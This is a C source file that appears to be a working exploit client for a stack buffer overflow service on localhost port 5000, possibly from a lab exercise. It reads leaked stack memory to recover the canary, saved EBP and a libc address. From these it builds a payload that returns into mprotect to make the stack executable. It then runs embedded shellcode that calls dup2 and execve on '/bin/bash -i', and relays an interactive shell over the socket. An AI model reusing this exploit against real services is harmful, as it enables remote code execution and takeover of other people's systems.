#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int main()
{
	struct sockaddr_in serv_addr;
	int sock, connfd;

	long shell[40];
	long pbuf[0x40];

	char *buf = (char *)pbuf;
	int buf_len = sizeof(pbuf);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("socket() failed\n");
		return -1;
	}

	memset(&serv_addr, '0', sizeof(serv_addr));

	const char* ip = "127.0.0.1";
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(5000);
	inet_aton(ip, &serv_addr.sin_addr);

	int ret = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 
	if (ret < 0) {
		printf("connect failed\n");
		return -1;
	}
	int l = buf_len;
	if (write(sock, &l, sizeof(l)) < 0) {
                printf("write failed\n");
                exit(-1);
        }

	memset(pbuf, 0x0, buf_len);
	if (read(sock, pbuf, buf_len) < 0) {
		printf("read() failed\n");
		exit(-1);
	}
	
	memset(shell, 0x0, sizeof(shell));

#if defined(X86)
	for (int i= 0; i < buf_len/4; i++) {
		printf("->> %x\n", pbuf[i]);
	}

	/* 8 Bytes shall be data for overflowed buffer */
	/* STACK CANARY PROTECTION */ shell[2] = pbuf[2];
	int libc_start = pbuf[22]; // extract __libc_start_main+0xf5
	printf("__libc_start_main+0xF5: %x\n", libc_start); // application saves return address of __libc_start_main+0xf5 on the stack
	libc_start -= 0xf5; // deduct offset to __libc_start_main
	libc_start -= 0x1edf0; // deduct offset from __libc_start_main to libc start
	printf("__libc_start: %x\n", libc_start);
	int ebp = pbuf[5];
	printf("EBP: %x\n", ebp);
	/* EBP */ shell[5] = ebp; // restore EBP
	// Libc offset to mprotect is 1024d0
	/* Start from EBP - 0x3C because shellcode is located at shell[21] - shell[6] = 15 * 4 = 60 or 0x3C */
	/* EBP - 0x3C */ shell[6] = libc_start+0x1024d0; // return address: mprotect
	printf("mprotect: %x\n", shell[6]);
	/* ESP */ int esp = (ebp & 0xfffff000);  // STACK address to be mprotect'ed
	printf("ESP: %x\n", esp);
	/* EIP */ int eip = ebp; // exec stack
	printf("EIP: %x\n", eip);
	/* EBP - 0x38 */ shell[7] = eip; // return address 2 after mprotect exit
	/* EBP - 0x34 */ shell[8] = esp; // addr to be changed on stack
	/* EBP - 0x30 */ shell[9] = 0x2000; // 1 page length
	/* EBP - 0x2C */ shell[10] = 0x7; // wrx
	/* EBP - 0x28 */ memcpy(&shell[11], "/bin/bash", strlen("/bin/bash"));
	/* EBP - 0x1C */ memcpy(&shell[14], "-i", strlen("-i"));
	/* EBP - 0x18 */ shell[15] = ebp - 0x28;
	/* EBP - 0x14 */ shell[16] = ebp - 0x1C;
	/* EBP - 0x10 */ shell[17] = 0x0;
	/* EBP - 0xC */ shell[18] = pbuf[7]; // connfd
	/* EBP - 0x8 */ shell[19] = libc_start + 0xf5090; // dup2@libc
	/* EBP - 0x4 */ shell[20] = libc_start + 0xcc180; // execve@libc
	char shellcode[] = "\x31\xc9\x51\x8d\x45\xf4\x8b\x10\x52\x8d\x5d\xf8\xff\x13\x41\x83\xf9\x03\x75\xee\x6a\x00\x8d\x45\xe8\x50\x8d\x45\xd8\x50\x8d\x45\xfc\xff\x10";
	printf("->> %d len shellcode\n", sizeof(shellcode));
	/* EBP - 0x0 */ memcpy(&shell[21], shellcode, sizeof(shellcode));
#elif defined(X86_64)
	for (int i= 0; i < buf_len/8; i++) {
		printf("->> %16lx\n", pbuf[i]);
	}
	return 0;
#endif

	if (write(sock, shell, sizeof(shell)) < 0) {
		printf("write failed\n");
		exit(-1);
	}


	int flags;
	flags = fcntl(0, F_GETFL, 0);
	fcntl(0, F_SETFL, flags|O_NONBLOCK);
	flags = fcntl(sock,F_GETFL,0);
	fcntl(sock, F_SETFL, flags | O_NONBLOCK);

	fd_set rfds;
	int retval;

	while ( 1 ) {
		memset(buf, 0x0, buf_len);
           
		FD_ZERO(&rfds);
        	FD_SET(0, &rfds);
	   	FD_SET(sock, &rfds);

		retval = select(sock+1, &rfds, NULL, NULL, NULL);

           	if (retval == -1) {
               		perror("select()");
		} else if (retval) {
			int ret;
			if (FD_ISSET(sock, &rfds)) {
				ret = read(sock, buf, buf_len);
				write(1, buf, ret);
			}
			if (FD_ISSET(0, &rfds)) {
				ret = read(0, buf, buf_len);
				if (ret) {
					write(sock, buf, ret);
				}
			}
	   	}
	}

	return 0;
}
